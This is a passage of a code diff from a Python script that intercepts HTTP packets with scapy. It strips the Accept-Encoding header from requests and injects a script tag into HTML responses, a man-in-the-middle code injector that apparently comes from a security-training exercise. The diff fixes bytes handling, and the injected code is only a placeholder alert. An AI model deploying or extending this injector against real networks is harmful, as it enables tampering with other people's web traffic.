@@ -38,14 +38,17 @@ def process_packet(packet):
             # Substituting the Accept-Encoding part to get plain HTML Code
             modified_load = re.sub("Accept-Encoding:*?\\r\\n", "", str(scapy_packet[scapy.Raw].load))
             new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(bytes(new_packet))
+            # packet.set_payload(bytes(new_packet))
+            packet.payload = new_packet.payload
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] HTTP Response")
             #print(scapy_packet.show())
-            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('JS code');</script></body>")
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>".encode(), "<script>alert('JS code');</script></body>".encode())
             new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(bytes(new_packet))
+            # packet.set_payload(bytes(new_packet))
+            packet.payload = new_packet.payload
+
     packet.accept()
 
 try:
